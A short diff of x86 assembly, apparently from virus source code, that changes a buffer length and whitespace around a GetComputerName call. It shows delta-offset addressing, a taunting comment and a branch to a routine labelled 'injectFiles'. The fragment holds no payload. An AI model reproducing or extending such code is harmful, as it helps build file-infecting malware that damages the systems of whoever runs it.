@@ -1,11 +1,11 @@
 ; WE ARE HERE MASTER ! COME GET ME !
 ; Get pseudo unique ids
-mov	[DELTA LengthName], 10
+mov	    [DELTA LengthName], 60
 PDELTA	LengthName
 PDELTA	ComputerName
 call	[DELTA pGetComputerName]
-cmp	eax, 0
-je	injectFiles
+cmp	    eax, 0
+je	    injectFiles
 push	NULL
 push	NULL
 push	NULL
